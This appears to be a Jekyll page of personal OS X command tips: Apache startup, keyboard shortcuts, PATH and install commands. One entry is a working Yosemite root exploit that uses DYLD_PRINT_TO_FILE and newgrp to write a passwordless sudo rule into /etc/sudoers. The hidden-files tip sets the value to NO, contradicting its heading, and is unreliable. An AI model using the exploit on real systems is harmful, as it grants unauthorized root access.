---
layout: default
title: OS X
---

## Always show hidden files: ##

{% highlight bash %}
defaults write com.apple.finder AppleShowAllFiles NO
{% endhighlight %}

## Start Apache on system startup: ##

{% highlight bash %}
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
{% endhighlight %}

## Keyboard shortcuts: ##

{% highlight bash %}
DEL = FN + BACKSPACE
PAGEUP/PAGEDOWN = FN + UP/DOWN
END = FN + RIGHT
HOME = FN + LEFT
MINIMIZE CURRENT WINDOW = CMD + M
SCREEN SHOT (PART) = CMD + SHIFT + 4
SCREEN SHOT (DESKTOP) = CMD + SHIFT + 3
CLOSE ACTIVE WINDOW = CMD + W
EXIT PROGRAM = CMD + Q
{% endhighlight %}

## Yosemite exploit for root access: ##

{% highlight bash %}
echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
{% endhighlight %}

## Add mysql to terminal shell: ##

{% highlight bash %}
echo 'export PATH=/usr/local/mysql/bin:$PATH' >> ~/.bash_profile
. ~/.bash_profile
{% endhighlight %}

## Install file (e.g. composer.phar) globally: ##

{% highlight bash %}
sudo mv %file% /usr/local/bin/%file%
{% endhighlight %}
